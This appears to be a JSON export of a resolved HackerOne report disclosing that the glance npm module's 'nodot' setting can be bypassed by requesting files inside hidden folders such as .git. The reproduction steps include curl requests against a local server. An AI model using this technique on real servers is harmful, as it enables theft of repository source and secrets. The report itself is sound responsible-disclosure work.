{
  "id": 490379,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80OTAzNzk=",
  "url": "https://hackerone.com/reports/490379",
  "title": "[glance] Access unlisted internal files/folders revealing sensitive information",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2019-02-02T15:32:02.524Z",
  "submitted_at": "2019-02-02T15:32:02.524Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "skyn3t",
    "url": "/skyn3t",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-02-28T19:25:51.550Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-02-28T19:25:19.678Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report sensitive information disclosure in `glance`.\nSimilar to #486933 in ways\n\n# Module\n\n**module name:** glance\n**version:** 3.0.5\n**npm page:** `https://www.npmjs.com/package/glance`\n\n## Module Description\n\na quick disposable http server for static files\n\n## Module Stats\n\n**weekly downloads**\n41\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe `glance` modules allows directory browsing and to serve static files through the browser.\nThe config option `nodot` can be used to prevent serving sensitive folders such as `.git` or `.DS_Store` \nrefer: https://github.com/jarofghosts/glance#command-line-options\nThis rule can be bypassed using the technique below which can lead to sensitive information disclosure (An interesting example: https://smitka.me/).\n\n## Steps To Reproduce:\n\n- Install `glance`\n```\n$ npm install -g glance\n```\n\n- Inside a project directory, initialise `git`.\n```\n$ git init\n```\n\n- Add rule to ignore dotfiles in `.glance.json`\n```json\n{\n  \"nodot\": true\n}\n```\n\n- Start `glance` in current directory.\n```\n$ glance --verbose\nglance serving /project/directory on port 8080\n```\n\n- Now, current directory will be served by serve with the exception of folder `.git` and file `.gitignore`.\n- If we try to curl .`git` or `.gitignore` we get a Not Found error\n```\n$ curl --path-as-is 127.0.0.1:8080/.git\n...\n<title>File Not Found</title>\n...\n```\n\n- Although if we try to fetch files/folders inside a forbidden [dot]folder there is no problem at all and most of it's content can be extracted successfully  (except dotfiles itself).\n```\n$ curl --path-as-is 127.0.0.1:8080/.git/HEAD      \nref: refs/heads/master\n```\n\n>The structure of git repository is well known, so it is possible to found references to the objects/packs in the repository, download them via direct requests and reconstruct the repository and obtain your files â€“ not only the current ones, but also the past files. \n\n## Supporting Material/References:\n\n- Ubuntu 16.04\n- node v11.3.0\n- npm 6.7.0\n\n# Wrap up\n\n> Select Y or N for the following statements:\n\n- I contacted the maintainer to let them know: [N]\n- I opened an issue in the related repository: [N] \n\n>Hunter's comments and funny memes goes here\n\n{F416786}\n\n## Impact\n\nThe essentially bypasses the `nodot` feature and allows an attacker to read from a directory that the victim has not allowed access to.\n\nReferences:\n- https://github.com/jarofghosts/glance#command-line-options\n- https://smitka.me/",
  "weakness": {
    "id": 89,
    "name": "Information Exposure Through Directory Listing"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 416786,
      "file_name": "meme.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/416/786/f70750a0c231dd0e1684a0fc4dbca1ce60e8068d/meme.png?response-content-disposition=attachment%3B%20filename%3D%22meme.png%22%3B%20filename%2A%3DUTF-8%27%27meme.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYGAVB3Z7%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T160432Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIAY19IlFbpZEGZZnklbjs4ufzCVl3nXNnn09ExIIE%2FeHAiEAj4AKUgJ9R9X1CSh20Sf0M1gNhMrLBbzNYoXykSz3T7YqsQUIFRADGgwwMTM2MTkyNzQ4NDkiDPzXazQCJX%2FwLDoqyCqOBWps58w1etIYIaa3P4zFfk1%2FaCWN2MdZKKnfhatw8%2BRlBLiTqrE4X6AWrTgkVNQaiOuaZj6%2F1nx616Pe3OvlEveMEaJZ%2Fbmch0Xy0FNaYc2jL9Ui8jSbXgliRLn6s5u1IqGMvC3mvbxuW1TtRuQ4w6%2BjlTLpwiEnD46PxGQ%2BN1LS9IfRcdKtQrmuo5LS6G47EyBAZgpYDewFSxQnnMWrnO7IP2KL2MXOdJqtCZSm2wMs6tRqaxA4NYf1ckGHB9BLfNvCvEhPuLWi0w8D43QWbSzKU6iTXZIhSQa6VJ7nVHvYnLNw5P7OPSutllqAi7vFeFh9RRCh%2BUEgCMLQXRaLrO05U3HrLVufbu5wAKObUJA1KJYgm4QWrmQplbpBgd4XHK9uM9xaHJEMEbLf63Wzwo%2Bgc3TNQOPf5GFxukBxWKzBzsF%2FSNkHKsB4Be8BLr51uA%2FaC%2BllGx66bht2Pd22zIxaotIyKSbZ3VPAywe%2BUDsCekJhwA3IYRjbmhP1JjWY5xjSHn33%2FqZAFp55N%2FUjra2pZAnU5kKWAe0hRjuFoL2%2FJdDB9dEbaeHg9WuTq20rPQvnaD%2FYlaL7e0gXYXJ3q7MWJZrvF7xRXVJeLKI3LIqXpGCUS9cT2wl2ozC9rdJtlPTo%2F%2F94aq1nMCqtbmdXclnV58KJ5%2FAYOa%2BbknaIzAxbz9ggeWCmL2q%2FWx3cnd0amN7StoXQFQEB%2FNBT2D85RUIFWGMkQoLsrntfSM0s2VFsHIhd%2F73sJc1D4o%2FRuQq0qa%2FtwTo9i81dTjaMPDGmWFu3Kk5oG4DV4Yo3o%2BXLOckPWZBYPLS7uxQDIsUp3HRANFj4NezhzyimR8z8gghPw3pFhTTEKogygCEL5HtLTTC0xr%2FGBjqxAcQdidZoi%2Fk%2BW9Mf6Q7OCXlCoIbidpUhf8Ta7ByIrgb92S9YJmtu2zJu%2BdsJTFs%2BYJY0PhxbOGwoFQdS4Zt8kbWFRmcEvyS8E0Ts5cgkw2CFr%2BVMiYvb6q7D0ep6LsVwua8Zef4rFGj7%2Ft8zlb91p2wZWlJZB2I3NIZUu09SMMV4euCSgXaL2BlIbO9tzyHcL%2BSpedojsGj3ZLrxc07VOpd9azvxsNbVbxWxRGTOK0nQEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f57a76c183332815ea323c0e0687f4922a682bebb689447eb4f5a4bd2992ce21",
      "file_size": 103711,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-03-30T19:25:19.855Z",
  "allow_singular_disclosure_after": -204496752.57176894,
  "singular_disclosure_allowed": true,
  "vote_count": 19,
  "voters": [
    "ermilov",
    "bl4de",
    "skyn3t",
    "deksterh11",
    "mrwell1ck",
    "kabeza",
    "blaksam",
    "grepthis",
    "gosh",
    "schlueter",
    "and 9 more..."
  ],
  "severity": {
    "rating": "high",
    "score": 7.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "high",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 6772,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "glance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
